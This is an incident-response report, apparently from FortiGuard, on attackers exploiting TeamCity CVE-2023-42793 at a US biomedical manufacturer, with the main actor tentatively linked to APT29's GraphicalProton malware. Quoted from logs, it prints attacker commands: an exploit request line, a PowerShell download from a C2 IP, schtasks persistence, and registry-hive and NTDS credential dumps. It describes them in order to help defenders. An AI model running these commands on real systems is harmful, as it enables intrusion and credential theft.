TeamCity Intrusion Saga: APT29 Suspected Among the Attackers Exploiting CVE-2023-42793

Introduction

On September 6, 2023, researchers from Sonar discovered a critical TeamCity On-Premises vulnerability (CVE-2023-42793[1]) issue.[2]
TeamCity is a build management and continuous integration server from JetBrains[3]. On September 27, 2023, a public exploit for this
vulnerability was released by Rapid7[4]. This critical vulnerability was given a CVE score of 9.8, most likely because an attacker can deploy
the publicly available exploit without authentication supporting remote code execution on the victim server using a basic web request to
any accessible web server hosting the vulnerable application. This vulnerability has been observed being actively exploited in the wild and
was added to CISA's 'Known Exploited Vulnerabilities Catalog' on October 4, 2023.[5]

In mid-October 2023, the FortiGuard Incident Response (IR) team sent a courtesy notification to an organization that had been
compromised due to this vulnerability.  This organization engaged the FortiGuard IR team to investigate the malicious activity in their
network.

The victim was a US-based organization in the biomedical manufacturing industry. Our subsequent investigation determined that initial
access for the attack was through the exploitation of the CVE-2023-42793 TeamCity vulnerability using a custom-built exploit script
written in Python. The behavior of the malware used in post-exploitation matches the GraphicalProton malware used by APT29. This article
breaks down our investigation and the outcome of our containment, eradication, and remediation efforts. As part of this analysis, we look
at threat actor TTPs employed throughout the intrusion and how they were identified and pieced together by the FortiGuard IR team.
MITRE ATT&CK mapping and observables are provided at the end of the article, alongside IOCs and FortiEDR Threat Hunting queries, to
assist with threat-hunting activities for similar behavior.

Analysis

Vulnerability Exploitation

As part of our initial customer engagement, we examined several EDR events reported from one of the victim's Windows application
servers (HOST_1_TEAMCITY). During a scoping call, the FortiGuard IR team identified that one of the applications hosted on this server was
TeamCity. The victim had only recently updated the application to a non-vulnerable version.

We began by retrieving application and system logs from the suspected compromised server (HOST_1_TEAMCITY). On analysis of the
application logs, we identified significant evidence of successful exploitation of the TeamCity vulnerability. The authentication bypass can
be observed in the screenshot of the teamcity-auth.log file, shown in Figure 2.

Figure 2: A snippet of the 'teamcity-auth.log' screenshot highlighting the TeamCity exploit evidence and associated remote IP.

Analysis of these logs showed that this vulnerability had been exploited multiple times over a relatively short period, with connections
originating from multiple unique public IP addresses. The teamcity-auth.log (authentication events log) identifies successful exploitation
but does not provide details on commands executed through exploitation. This information is available in the separate 'teamcity-server.log'
file, a general server log for the TeamCity software. Analyzing this log file around confirmed attempted remote code execution on the same
host. For example, the IP address 167[.]179[.]75[.]213 taken from the highlighted log entry in Figure 2 was correlated with the echo
command execution log highlighted in the 'teamcity-server.log' entry in Figure 3. Details of the external command execution from the
'teamcity-server.log file can also be seen in Figure 3.

Figure 3: A snippet of the 'teamcity-server.log' showing remote code execution evidence, including the associated command executed through the exploitation.

Further analysis of the various commands executed on the vulnerable server through this RCE exploit led the IR team to believe multiple
threat actors were conducting simultaneous operations. Some commands executed as part of this intrusion are shown in Table 1.

Table 1. Commands executed by multiple threat actors on the TeamCity software host HOST_1_TEAMCITY.

Looking critically at some of the attempted commands, it appears that some of the threat actors successfully exploited the vulnerability
but were unsuccessful at running Linux system commands on the victim Windows Server. An example of this behavior can be seen in
Figure 4.

Figure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation.

It appears that several of the commands from various remote IPs may have been associated with the use of the open-source vulnerability
scanner Nuclei[6]. The IR team found a Nuclei template (CVE-2023-42793.yaml) designed to identify the presence of the TeamCity
vulnerability in Nuclei's official template repository[7]. The yaml template file contains the following line:

POST /app/rest/debug/processes?exePath=echo&params={{randstr}} HTTP/1.1

The resulting request would produce an echo command on a successfully exploited TeamCity server, identical to the echo commands
observed in the victims' TeamCity logs. The IR team collated information from both logs to better understand the correlations between
when the echo commands were executed and the associated network connections from the numerous public IP addresses. A snippet of
this correlation is shown in Figure 5, where the echo commands generated by some of the Nuclei scanning are also highlighted.

Figure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei
scanning.

At this stage of the intrusion, it became clear that multiple threat actors were scanning for the vulnerability, validating if it could be
exploited, and attempting to establish a foothold using the related exploitation. The following section of this report focuses on the activities
of one of these threat actors distinct from other threat actor activities. We will refer to this culprit as the 'main threat actor.' A description of
the activities conducted by other threat actors exploiting this vulnerability is covered more extensively in the following 'Other Threat Actors
Activity' section.

Main Threat Actor Intrusion

The first activity attributed to the main threat actor was the execution of an echo command like those discussed above, indicating that the
main threat actor likely employed Nuclei to identify potential victims. After this initial command, the main threat actor began executing
additional discovery commands to gather system and privilege information. Some of these discovery commands are shown below:

cmd.exe "/c systeminfo"

whoami

ipconfig /all

whoami /all

The command attributed to the Nuclei scanning, as well as these subsequent discovery commands, were linked to different remote IP
addresses. However, we assessed them as being from the same actor due to the slight timeline difference of a few seconds between the
activities. This indicates the main threat actor uses different infrastructures to scan for victims and execute later commands.

One command and control (C2) IP address discovered during our investigation was linked to a US-based tertiary education organization.
Upon detection of this active exploitation, the FortiGuard IR team notified the organization that their infrastructure may have been
compromised and part of an ongoing APT29 campaign. They performed an internal investigation and identified exploitation of their
vulnerable TeamCity server associated with the previously identified IP address. As part of this exploitation, the main threat actor used the
TeamCity exploit to install an SSH certificate, which they then used to maintain access in this second victim's environment. The
organization's security team provided additional information to the FortiGuard IR team, who then identified that the source of the attack on
the educational organization was a TOR exit node. This report does not include the victim’s details used as a relay to protect their identity.
They have successfully remediated their environment and patched the associated vulnerability.

 After executing the discovery commands outlined above, the main threat actor attempted to download a DLL file, 'AclNumsInvertHost.dll,'
on the TeamCity host using PowerShell and the 'Invoke-WebRequest' cmdlet. The actor used the following command to download the file:

powershell -exec bypass -c "Invoke-WebRequest -Uri

hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile

C:\Windows\System32\AclNumsInvertHost.dll"

After successfully downloading this DLL file on the HOST_1_TEAMCITY, the main threat actor again used the TeamCity RCE vulnerability to
create a Windows-scheduled task referencing this DLL file. They likely did this for persistence and to abstract their execution from the
TeamCity exploitation. The actor used the following command to create the scheduled task:

schtasks.exe /create /SC ONLOGON /tn

"\Microsoft\Windows\DefenderUPDService" /tr

"\"C:\Windows\system32\rundll32.exe\"

\"C:\Windows\system32\AclNumsInvertHost.dll\",AclNumsInvertHost"

We recovered the associated Windows task file from the victim TeamCity server (HOST_1_TEAMCITY), confirming that the command in the
TeamCity log had been successfully executed and the scheduled task was created. The retrieved Windows task data is shown in Figure 6:

Figure 6: Windows task created by threat actor for the persistence of a DLL file.

After successfully creating the scheduled task, the actor attempted to execute the newly created task using the following command, again
executed through the TeamCity RCE vulnerability on the HOST_1_TEAMCITY:

schtasks.exe /run /tn "\Microsoft\Windows\DefenderUPDService"

Analyzing the scheduled task and its method of creation, we noticed two main indicators of interest: the URL
'hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll' and the file 'AclNumsInvertHost.dll.' We then analyzed the URL referenced for
downloading this payload. At the time of the incident, there was limited open-source information on the IP contained in the URL or
associated URLs. However, the certificate used on the webserver hosted at this IP was of interest. The certificate is expired with the
common name '*.ultasrv[.]com'. This common name does not appear to be associated with a legitimate organization[8]. The entity
associated with ultasrv[.]com seems to be a VPS (Virtual Private Server) provider. Looking more closely at the webserver itself, we
identified that it had an accessible open directory service. We then used this access to identify additional payloads hosted by the
associated threat actor. The files on the server can be seen in Figure 7.

Table 2. Descriptions of files found on the C2 server 103.76.128[.]34.

Analysis of the code in the poc.py file identified the script as a custom Python implementation of an exploit for the TeamCity vulnerability
CVE-2023-42793. You can see the request URL found in the log and the Python code used to generate the request in Figure 8.

Figure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation.

Comparing the structure of a request sent using this script and the commands executed from the victim logs, it is almost certain that this
script was used to deliver the exploit to the victim TeamCity server (HOST_1_TEAMCITY ). This links the IP extracted from the scheduled
task (103[.]76[.]128[.]34) to the source of the exploitation from the logs shown in Figure 9 (45[.]138[.]16[.]63). Using the FortiGuard
Central Threat System (CTS), we could also see that the IP address associated with the exploitation has been linked to other significant
malicious activity. Of the 171 domains associated with this IP, 92 have been tagged with high confidence as malicious, and 78 have been
tagged with high confidence as suspicious. Only one of the domains has been tagged as low risk (Figure 9).

Figure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment.

The other element of interest in the scheduled task created by the main threat actor was the DLL file, 'AclNumsInvertHost.dll.' Our analysis
identified that the DLL AclNumsInvertHost.dll has ten file sections. The most notable was '.fy55f5', which is a user-modified section. This
section has an MZ header (indicating it is a Windows portable executable), but the remainder of the code has a high entropy of 7.99, which
is typically indicative of encryption. The '.fy55f5' section can be seen in Figure 10.

Figure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor's scheduled task persistence.

The IR team believes that this '.fy55f5' section of the DLL contains the final payload, which is decrypted at runtime. There are a number of
anti-debug techniques implemented within the DLL file code that inhibited dynamic analysis during the engagement. To understand the
DLL functionality more quickly, we performed comprehensive Yara scanning of all the files pulled from the threat actors' webserver. The
AclNumsInvertHost.dll library and multiple other DLL files matched on a Yara rule for a known malware family called 'GraphicalProton.' The
positive Yara rule match was developed by Insikt Group from Recorded Future and is based on a specific API calling method employed by
previously observed GraphicalProton samples. A match for this rule is a high-confidence indicator of GraphicalProton. The results of the
matching Yara scan are shown in Figure 11.

Figure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server.

The files in Figure 11 also matched the Yara rule M_Dropper_BURNTBATTER_1, which searches for the custom chaskey implementation. This
Yara rule was from the article, 'Backchannel Diplomacy: APT29's Rapidly Evolving Diplomatic Phishing Operations,' by Mandiant[9].

GraphicalProton is a malware historically employed by group APT29. While this tooling is confidently linked to APT29 (Mandiant) or
BlueBravo (Recorded Future), the victimology and initial access vector employed by the main threat actor throughout earlier stages of this
intrusion does not align with currently reported APT29 campaigns. However, a previous well-known attack from APT29 targeted the
company Solarwinds, using the same build of the TeamCity management tool[10]. While the IR team could not attribute this activity to
APT29 with high confidence, associated threat intelligence was used to focus our investigation further.[11]

At this stage of the intrusion, FortiEDR detected and blocked this scheduled task from executing due to its suspicious use of rundll32.exe
and a machine learning assessment of the previously unobserved DLL 'AclNumsInvertHost.dll.' This forced the main threat actor to attempt
alternative methods of execution.

The first alternative method was to use the TeamCity exploit on HOST_1_TEAMCITY to download the 'iisexpresstray.exe' and 'mscoree.dll'
files from the same C2 through PowerShell. These two files were written to the directory' C:\Windows\WinStore\'. The 'iisexpress.exe' file is
a legitimate signed installer executable for IISExpress, a lightweight implementation of IIS provided by Microsoft[12]. However, downloaded
alongside this legitimate installer was 'mscoree.dll,' a malicious DLL file with the same name as a legitimate DLL (T1036.005).[13] The
combination of these two files would allow the threat actor to employ DLL search order hijacking (T1574.001)[14] to execute their malicious
DLL when the legitimate IISExpress executable is executed.

To execute this side-loading attack, the main threat actor created another scheduled task using the following command executed via the
TeamCity exploit:

schtasks.exe /create /SC ONSTART /tn

"\Microsoft\Windows\IISUpdateService" /tr

"C:\Windows\WinStore\iisexpresstray.exe" /RU "SYSTEM" /f

After the scheduled task was created, the threat actor executed the scheduled task using the following command:

schtasks.exe /run /tn "\Microsoft\Windows\IISUpdateService"

When the 'iisexpresstray.exe' file was executed on the HOST_1_TEAMCITY, a separate thread was created by the malicious DLL file that
tried to access the system credentials through lsass.exe. This attempt was also blocked by FortiEDR. This is shown in the event graph in
Figure 12.

Figure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe.

The main threat actor had used multiple legitimate software in this attack. The list of legitimate files is shown in the table below. Some of
the executables listed in Table 3 were recovered from the opendir[15] web server.

Sr. No. File Name Description

1 iisexpresstray.exe Legitimate IIS Express exe used for the execution of malicious DLL mscorees.dll

2 MpCmdRun.exe Legitimate Defender command line utility used for execution of malicious DLL
MpCmdHelp.dll

3 FlashUtil_ActiveX.exe Legitimate Flash exe used for the execution of malicious DLL oleac.dll

4 zabbix_agentd.exe Legitimate executable to Zabbix software used to load the malicious DLL pdhui_1.dll

Table 3. List of legitimate software executables observed in the attack and on the C2 server, which are used to load malicious DLL files.

Since FortiEDR blocked the execution of this second malicious DLL file, the main threat actor changed their approach and attempted to
dump the registry using Windows utility reg.exe directly through further TeamCity exploitation. Unfortunately for the main threat actor,
FortiEDR blocked this execution due to the triggered rules 'Access to Critical System Information' and 'Connection Attempt from a Hidden
Process' under its 'Exfiltration Prevention' security policy. A screenshot of the related FortiEDR event is shown in Figure 13.

Figure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR.

These attempts represent only two of the many credential dumping techniques the threat actor attempted to employ within the victim
environment. Fortunately, the FortiEDR software installed on the majority of their endpoints, including the victim server, blocked these
techniques. The associated EDR security events also generated multiple alerts. Unfortunately, the targeted organization made numerous
broad exceptions for this malicious behavior. This was likely due to the behavior originating from the TeamCity application, so they were
incorrectly assessed as a false positive. These exceptions are outlined below:

1. allow rundll32.exe to run AclNumsInverHost.dll when rundll32.exe is executed by cmd.exe.
2. allow reg.exe to run as a hidden process
3. allow reg.exe to access critical system information (credential dumping)
4. allow natid.sys to be loaded (a suspicious driver dropped by the threat actor)
5. allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any lsass.exe process
6. allow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any svchost.exe process
7. allow any execution of PowerShell and associated rule violations

These exceptions removed the constraints around the adversary's ability to fully employ their TeamCity exploitation, allowing the main
threat actor to continue their execution unrestricted by FortiEDR.

After these exceptions were set, the main threat actor was able to successfully dump the registry of the Windows host HOST_1_TEAMCITY
to gain access to local user credentials (T1003.002)[16]. To achieve this, the threat actor used reg.exe to dump the SYSTEM registry hive
(T1003.002[17]) using the command below:

reg.exe save HKLM\SYSTEM “C:\Windows\temp\1\sy.sa” /y

This can be seen in the FortiEDR Threat Hunting event shown in Figure 14.

Figure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive.

At this stage, the main threat actor continued to employ their TeamCity exploit for execution, trying alternative techniques to establish a
more robust foothold on the HOST_1_TEAMCITY. They used their access to create a Windows account, 'oldadministrator' (T1136.001[18]),
added the newly created account to the local administrators group, and made the account a special account by adding it to the registry
path 'NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist' with the DWORD value 0. When a Windows user account is added to this
registry location with value 0, the account is not shown on the Windows GUI login screen. This was likely done to hide their new access
and ensure persistence from direct observation by normal system users. However, the IR team did not observe that the main actor ever
used this newly created 'oldadministrator' account. Log events associated with these activities can be observed in the teamcity-server.log
snippet shown in Figure 15.

Figure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint.

At this time, the host HOST_1_TEAMCITY was patched for CVE-2023-42793. The IR team verified the patch was successful and that there
was no further exploitation of this vulnerability on this host following the installation of the patch. Unfortunately, the threat actor had
already created alternative access through their GraphicalProton implant and had already begun laterally moving to other hosts within the
victim network through SMB, RDP, and remote WMIC commands.

The hosts HOST_3_SVR and HOST_4_SVR were targeted using WMIC commands (T1047)[19] from the original compromised host,
HOST_1_TEAMCITY. The network connections linked to this behavior were established using explicit credentials. This indicates that the
main threat actor had successfully pulled credentials prior to this activity. The IR team thinks this WMIC activity was likely conducted to
execute a GraphicalProton DLL through either rundll32 proxy execution like that demonstrated in the previously discussed scheduled task
or through search order hijacking using one of the binary and DLL pairs pulled from the main threat actor C2 opendir web server. You can
see evidence of the network connection associated with this WMIC activity from the Windows event log in Figure 16.

Figure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR

On the HOST_2_SVR, the main threat actor employed a different lateral movement technique by establishing an RDP connection from the
HOST_1_TEAMCITY. This connection was used to create multiple suspicious files in the 'C:\Windows\SchCache’ directory on HOST_2_SVR.
Two DLL files (‘oleacc.dll’ and ‘oleac.dll’) and one executable file (‘FlashUtil_ActiveX.exe’) were created in this directory. When the IR team

ran a Yara scan against these files, the DLL file oleac.dll matched the Yara rule for GraphicalProton. The remaining files, oleacc.dll and
FlashUtil_ActiveX.exe, were determined to be non-malicious Microsoft-signed files.

The main threat actor then created persistence for this file through a scheduled task. This time, the task was named 'WindowsActiveX' and
was created to execute the 'C:\Windows\SchCache\FlashUtil_ActiveX.exe' file when Windows starts. This shows the use of another
legitimate executable to perform search order hijacking to load a malicious GraphicalProton DLL. The command used to create this
scheduled task can be observed in the FortiEDR Threat Hunting event, shown in Figure 17.

Figure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe

In another credential dumping attempt, the main threat actor tried to dump active directory credentials using the Windows utility
‘ntdsutil.exe’ on the host HOST_2_SVR. They tried to dump credentials using the following command:

ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\tempp' q q

This command aims to dump the ntds.dit file, the SYSTEM registry hive, and the SECURITY registry hives in the given path (in this case,
‘C:\tempp’). Threat actors can often dump password hashes from these files offline using tools like mimikatz.[20] FortiEDR blocked this
activity, and the associated security event can be observed in Figure 18.

Figure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR.

In addition to this scheduled task, the IR team found another GraphicalProton DLL in the ‘C:\Program Files\Windows Defender’ directory.
This directory contained an executable PE file, ‘MpCmdRun.exe,’ and DLL files, ‘MpCmdHelp.dll’ and ‘MpClient.dll.’ One of the files
(MpCmdHelp.dll) matched against the Yara rule for malware GraphicalProton, and the second DLL file, MpClient.dll, is a legitimate library
used by ‘MpCmdRun.exe.’ Like the ‘FlashUtil_ActiveX.exe’ example discussed earlier in this report, the ‘MpCmdRun.exe’ is a legitimate
binary vulnerable to search order hijacking. The ‘MpCmdRun.exe’ binary is an official command-line tool used to perform various operations
related to Microsoft Defender Antivirus. The default path of this binary is ‘C:\Program Files\Windows Defender.’

At this investigation stage, the team performed large-scale Yara scanning to identify additional potentially compromised hosts. This
scanning identified DLL files matching the GraphicalProton signature written to disk on the hosts HOST_6_SQL and HOST_7_SVR. On both
hosts, a task named ‘WindowsDefenderService’ that executed the GraphicalProton DLLs was created, matching the tradecraft of the
previously discussed scheduled tasks. One of the scheduled task files associated with these tasks can be seen in Figure 19.

Figure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL.

The IR team also found a network login to HOST_5_SVR from the primary infected HOST_1_TEAMCITY host.

Shortly after this login event, an instance of rundll32 used for proxy execution of another GraphicalProton sample was started. However,
the process crashed. This resulted in a memory dump of the rundll32.exe process. The IR team performed strings analysis of the memory
dump and found URLs of graph.microsoft[.]com and 1drv[.]ms, which are legitimate domains related to Microsoft OneDrive operations. The
IR team also found an email address (quentparoty[@]outlook.com) in the memory dump, although this indicator has not been linked to any
known IOCs. However, it has been included for completeness. Significant strings extracted from the memory dump can be seen in Figure

Similar network indicators were identified when we executed the AclNumsInvertHost.dll file using rundll32.exe in a virtual analysis
environment. The IR team also observed connections to api.dropboxapi[.]com from the rundll32.exe in the Threat Hunting data of the
victim environment. The GraphicalProton report[21] from Insikt Group from Recorded Future showed that researchers had previously
observed GraphicalProton samples employ Microsoft OneDrive and Dropbox as part of their C2.

The malicious DLL samples were shared with analysts from the FortiGuard Forensics Team for further malware analysis. They confirmed
that the behavior of the multiple malicious DLL matches GraphicalProton malware behavior. The malicious DLL was communicating with
Microsoft OneDrive, and the following information was obtained in JSON format from this communication.

The analyst team also observed numerous anti-debugging techniques in malicious DLL files, such as a call to NtQueryObject to look for the
“DebugObject” variable. It also has strings such as “Ollydbg,” probably to check if the Ollydbg.exe process is running. If the process is
found running, the malware may then terminate itself.

Given our understanding of the main threat actor’s operations, we determined that persistence was still possible. The IR team provided
recommendations on removing existing adversary accesses and persistence. A high-level view of the containment and eradication actions
recommended are provided below:

1. Blocking the IP addresses used by threat actors
2. Removing TeamCity software accounts created by threat actors
3. Removing Windows accounts created by threat actors
4. Removing backdoors created by threat actors
5. Removing malicious files dropped by threat actors

After implementing these containment and remediation actions by the victim security team, no further malicious activity has been
observed.

Other Threat Actor Activity

In addition to the main threat actor, there were other threat actors who exploited the TeamCity vulnerability. One of these threat actors
used their RCE access through the exploit to create a new TeamCity user via the TeamCity API. They then added the ‘System administrator’
role to this newly created user account. No evidence was found to indicate that this newly created account was ever used once it was
created. Logs related to this activity were recorded in the teamcity-server.log and can be seen in Figure 21.

Another threat actor separately attempted to download and execute an executable from an Amazon S3 bucket. Using an Amazon S3
Bucket instead of a separate C2 for file downloads differs from the actions of the main threat actor. This is significant, as many
organizations include Amazon Services URLs in their allowlist. The threat actor used the ‘DownloadFile’ method of the PowerShell
‘WebClient’ class to download the Amazon-hosted payload. The file was saved as ‘1.exe’ in the path ‘C:\Windows\Temp\1.exe’. After
downloading this file, the threat actor attempted to execute it using the command ‘cmd.exe /c C:\Windows\Temp\1.exe’. Windows Defender
logs indicate this file was detected as Trojan:Script/Phonzy.B!ml malware by Windows Defender shortly after download and was deleted
before it could be executed. Associated log events within the teamcity-server.log linked to this download activity are shown in Figure 22.

Figure 22: TeamCity log showing download and execution of 1.exe by the threat actor.

Another threat actor used their TeamCity exploit to download and execute the installer for legitimate remote access software AnyDesk on
the HOST_1_TEAMCITY. The AnyDesk software was installed with the ‘--start-with-win' parameter, making it auto-start on boot. The ‘--
silent’ parameter was also used, which prevents the AnyDesk application from showing any messages or errors during execution. The
threat actor then set a password to AnyDesk and executed it with the ‘--get-id' parameter to retrieve the AnyDesk-ID. This ID is used to
connect to an instance of AnyDesk. This software is an implementation of a command-and-control technique (T1219[22]) and also
supports persistence as the threat actor can use the AnyDesk-ID to connect to a running instance of the software. Log events associated
with these activities in the teamcity-server.log snippet are shown in Figure 23.

Figure 23: The TeamCity log showing the installation and execution of the Anydesk remote access tool.

The Fortinet IR team was able to link connections made from the host HOST_1_TEAMCITY from the AnyDesk application to IP address
92.38.177[.]14. When we investigated, it was found to be an AnyDesk software relay address. Using relays as part of AnyDesk
infrastructure allows threat actors to abstract their own infrastructure from intrusions. FortiGuard CTS information for the relay IP is shown
in Figure 24. It’s worth noting that FortiGuard CTS marked this as clean because AnyDesk is a common remote management tool that, by
default, uses AnyDesk infrastructure, which is not malicious by itself.

The connections made by AnyDesk.exe can be seen in Figure 25.

These actors tried one or two methods but did not conduct further activity on the server or victim network. They likely lacked the
knowledge or interest to pursue further intrusion on the victim network, as their initial efforts were ineffective.

Conclusion

This article provided details of several intrusions where the TeamCity vulnerability CVE-2023-42793 was exploited to gain access to the
victim network. Observed exploitation originated from multiple disparate threat actors who employed numerous diverse post-exploitation
techniques in an attempt to gain a foothold in the victim network. It should be noted that this activity occurred after the vendor (JetBrains)
had provided a valid patch.

While the security controls in place within the victim's environment were able to keep the majority of adversaries at bay, a failure to
adequately triage alerts generated by the victim's EDR (FortiEDR) and subsequent downgrading of protections opened gaps in the victim's
defenses. This allowed the main threat actor to establish a foothold and eventually gain the access required to maneuver freely through
the network.

As part of this intrusion, the main threat actor employed the GraphicalProton malware to maintain access. The main threat actor primarily
used Scheduled Tasks (T1053.005[23]) to execute these GraphicalProton payloads. Their preferred method of defense evasion for these
scheduled tasks was rundll32 proxy execution, but the threat actor was also able to employ several legitimate third-party binaries that
were vulnerable to search order hijacking to execute their malware. Given the technique crossover with previously reported activity and the
identification of the GraphicalProton payload, FortiGuard believes with medium confidence that this attack was part of a new BlueBravo
(tracked by Recorded Future[24])/APT29 (tracked by Mandiant[25]) campaign. Of particular note are the significant OPSEC considerations
employed throughout the intrusion (discounting the opendir web server fumble): the use of compromised infrastructure local to the victim,
search order hijacking with legitimate DLLs added after execution, the quality of masquerading, and the use of single-use infrastructure
components.

IOCs

The following IOCs are from the investigation, analysis of the samples, and subsequent activity observed on the same host between initial
detection and remediation by the customer. In addition to these IOCs directly observed by the FortiGuard IR team, several samples that
match the characteristics of observed samples have been included to assist with detecting historical activity.
